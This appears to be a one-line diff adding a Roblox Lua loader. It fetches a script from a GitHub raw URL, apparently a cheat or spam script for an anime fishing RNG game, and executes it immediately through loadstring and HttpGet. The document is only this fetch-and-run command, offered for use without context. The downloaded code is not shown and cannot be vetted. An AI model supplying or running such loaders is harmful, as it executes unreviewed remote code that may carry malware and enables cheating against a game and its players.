@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/fish-an-anime-rng-spam6-o65aohn5g04oej.lua"))()
